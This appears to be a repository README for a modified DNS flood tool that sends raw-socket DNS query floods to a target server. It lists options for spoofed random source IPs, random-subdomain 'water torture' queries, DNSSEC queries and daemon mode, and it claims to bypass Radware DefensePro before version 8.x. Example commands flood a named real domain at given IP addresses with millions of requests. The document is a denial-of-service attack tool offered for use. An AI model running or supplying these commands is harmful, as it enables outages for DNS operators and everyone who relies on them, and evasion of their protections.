# dns-flood
Original DNS-Flood tool found on code.google.com

This is modified version od DNS-Flood tool. 
Use raw sockets to generate DNS flood attack.

Original Here: https://code.google.com/p/dns-flood/

In contrast to original tool it provides:
  - subdomain part of query randomization aka DNS Water Torture
  - source port and TTL randomization
  - additional query types like AAAA and MX
  - DNSSEC query support

The tool is able to bypass Radware DefensePro SW version prior to 8.x.

## How to install

1. Clone Repo
2. Run Make
3. Enjoy Kittens
 
## How to run

Usage:
```bash
./dnsflood <query_name> <destination_ip> [options]  
	Options:  
	-t, --type		query type  
	-s, --source-ip		source ip  
	-p, --dest-port		destination port  
	-P, --src-port		source port  
	-i, --interval		interval (in microseconds) between two packets  
	-n, --number		number of DNS requests to send   
	-d, --duration		run for at most this many seconds   
	-r, --random-src	fake random source IP
	-R, --random-sub	prefix with random subdomain names
	-S, --dnssec		make a dnssec query
	-D, --daemon		run as daemon  
	-h, --help			print this message   
```
Example:
```bash
$ ./dnsflood abf.auction.co.kr 127.0.0.1 -d 30
sent 5333186 DNS requests in 30.000000 sec.
$
$ ./dnsflood abf.auction.co.kr 10.40.196.84 -n 5000000
sent 5000000 DNS requests in 28.000000 sec.
$
```

## Credits for original version

Original DNS-Flood tool found on code.google.com

Use raw sockets to generate DNS flood attack.

Original Here: https://code.google.com/p/dns-flood/
